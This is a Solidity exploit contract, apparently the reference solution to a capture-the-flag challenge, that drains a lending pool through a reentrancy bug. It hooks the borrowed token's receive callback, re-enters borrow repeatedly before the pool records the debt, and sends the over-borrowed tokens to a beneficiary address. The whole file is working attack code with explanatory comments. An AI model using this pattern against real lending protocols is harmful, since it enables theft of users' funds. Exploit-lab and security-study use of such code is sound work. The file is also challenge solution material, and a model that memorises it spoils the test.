// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {HookToken, ITokenReceiver} from "../contracts/HookToken.sol";

interface ILendingPool {
    function supplyCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

/// @title Attacker
/// @notice Reference exploit contract for the Cream-style lending reentrancy.
///
///         The constructor registers this contract as a `HookToken` recipient
///         (so its `tokensReceived` fires whenever it receives the hook-calling
///         borrowable token) and grants the pool an infinite collateral
///         allowance. `attack()` calls `pool.borrow(borrowAmount)`; the pool
///         pays the borrowed hook-calling token out *before* updating
///         `borrows`, so `tokensReceived` re-enters `borrow` up to `maxDepth`
///         times. Every reentrant borrow passes the collateral check against
///         the same stale `borrows` value, so the attacker extracts
///         `(maxDepth + 1) * borrowAmount` against collateral that only covers
///         a single `borrowAmount`. After the reentrancy unwinds, the contract
///         forwards all borrowed tokens to the beneficiary EOA so its balance
///         crosses the profit threshold.
contract Attacker is ITokenReceiver {
    IERC20 public immutable asset;            // collateral token (plain ERC-20)
    HookToken public immutable hookToken;     // borrowable token (hook-calling)
    ILendingPool public immutable pool;
    /// @dev EOA that receives the over-borrowed tokens (the claimer).
    address public immutable beneficiary;

    uint256 public borrowAmount;
    uint256 public maxDepth;
    uint256 public depth;

    constructor(address asset_, address hookToken_, address pool_, address beneficiary_) {
        asset = IERC20(asset_);
        hookToken = HookToken(hookToken_);
        pool = ILendingPool(pool_);
        beneficiary = beneficiary_;

        // Opt in to the recipient hook: from now on every HookToken transfer
        // to this contract calls tokensReceived below.
        hookToken.registerReceiver(address(this));
        // Allow the pool to pull collateral via supplyCollateral.
        asset.approve(address(pool), type(uint256).max);
    }

    /// @notice Post `amount` of collateral (the contract must already hold it).
    function supplyCollateral(uint256 amount) external {
        pool.supplyCollateral(amount);
    }

    /// @notice Launch the reentrant over-borrow. The contract must already have
    ///         posted collateral via {supplyCollateral}.
    function attack(uint256 borrowAmount_, uint256 maxDepth_) external {
        borrowAmount = borrowAmount_;
        maxDepth = maxDepth_;
        depth = 0;

        // The outermost borrow. The pool pays out the hook-calling token before
        // settling borrows, so tokensReceived re-enters borrow below.
        pool.borrow(borrowAmount_);

        // Forward the over-borrowed tokens to the beneficiary EOA so its
        // hook-token balance crosses the profit threshold and the controller
        // releases the flag.
        uint256 bal = hookToken.balanceOf(address(this));
        if (bal > 0) {
            hookToken.transfer(beneficiary, bal);
        }
    }

    /// @inheritdoc ITokenReceiver
    /// @dev Called by the HookToken *after* it updated balances but *before*
    ///      the pool's `borrow` has increased `borrows`. Re-enter `borrow` while
    ///      the debt ledger is still stale.
    function tokensReceived(
        address,
        address,
        address,
        uint256
    ) external override {
        require(msg.sender == address(hookToken), "Attacker: only hook token");
        if (depth < maxDepth) {
            depth += 1;
            pool.borrow(borrowAmount);
        }
    }
}
